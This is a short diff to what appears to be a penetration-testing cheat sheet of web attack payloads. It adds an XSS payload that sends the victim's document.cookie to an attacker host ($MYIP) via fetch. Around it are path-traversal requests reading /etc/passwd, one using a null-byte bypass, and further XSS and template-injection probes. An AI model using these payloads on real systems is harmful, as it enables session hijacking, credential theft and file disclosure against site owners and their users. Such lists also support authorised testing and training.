@@ -502,6 +502,7 @@ GET /image?filename=/var/www/images/../../../etc/passwd
 GET /image?filename=../../../etc/passwd%00.png
 
 [*] XSS
+<img src=x onerror=fetch('http://$MYIP/'+document.cookie);>
 <img src=x>'"${{7*7}}
 <svgonload=alert(document.cookie)>
 <svg/onload=alert(document.cookie)>
